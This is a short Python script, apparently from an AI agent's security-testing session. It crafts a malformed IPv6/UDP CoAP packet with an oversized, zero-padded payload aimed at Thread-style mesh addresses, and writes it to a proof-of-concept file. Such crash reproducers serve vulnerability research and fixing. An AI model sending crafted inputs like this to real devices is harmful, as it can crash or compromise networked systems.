from struct import pack
src=bytes.fromhex('fdde ad00 beef 0000 0000 00ff fe00 0001'.replace(' ',''))
dst=bytes.fromhex('fdde ad00 beef 0000 0000 00ff fe00 fc00'.replace(' ',''))
coap=bytes([0x40,0x02,0x12,0x34, 0xB1])+b'c'+bytes([0x02])+b'cg'+bytes([0xff, 13,255])+bytes([0x00])*255
udp_len=8+len(coap)
udp=pack('!HHHH',61631,61631,udp_len,0)+coap
# checksum
def csum(data):
    if len(data)%2: data += b'\x00'
    s=sum((data[i]<<8)+data[i+1] for i in range(0,len(data),2))
    while s>>16: s=(s&0xffff)+(s>>16)
    return (~s)&0xffff
pseudo=src+dst+pack('!I3xB',len(udp),17)
chk=csum(pseudo+udp)
udp=pack('!HHHH',61631,61631,udp_len,chk)+coap
ip=bytes([0x60,0,0,0])+pack('!HBB',len(udp),17,64)+src+dst
poc=bytes([0])+ip+udp
open('/workspace/poc1.bin','wb').write(poc)
print(len(poc), len(coap), udp_len, hex(chk), poc[:80].hex())
PY
